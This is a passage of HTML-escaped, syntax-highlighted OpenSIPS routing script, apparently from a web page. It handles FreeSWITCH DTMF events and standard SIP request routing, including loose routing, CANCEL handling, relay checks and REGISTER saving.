&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_store&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DTMF-&lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(body/Unique-ID)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OK&amp;#34;&lt;/span&gt;, 600&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;event_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;E_FREESWITCH&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	fetch_event_params&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(event_name);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(fs_box);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(event_body)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FreeSWITCH event &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(event_name) from &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(fs_box), with &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(event_body)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; :&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;event_body&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;event_name&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DTMF&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$rU &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/Caller-Destination-Number&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!$rU&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SCRIPT:DTMF:ERR: missing body/Caller-Destination-Number field!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;goes_to_support, 0&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;FREESWITCH_XFER_BY_DTMF_LANG&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;has_totag&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# handle hop-by-hop ACK (no routing required)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# sequential request within a dialog should&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# take the path determined by record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !loose_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# we do record-routing for all our traffic, so we should not&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# receive any sequential requests without Route hdr.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not here&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BYE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# do accounting even if the transaction fails&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# route it out to whatever destination was set by loose_route()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# in $du (destination URI).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# CANCEL processing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CANCEL&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$fd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# if caller is not local, then called number must be local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Rely forbidden&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# preloaded route checking&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_ERR&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attempt to route with preloaded Route&amp;#39;s [&lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$tu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Preload Route denied&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# record routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER|MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# requests for my domain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUBLISH|SUBSCRIBE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Service Unavailable&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
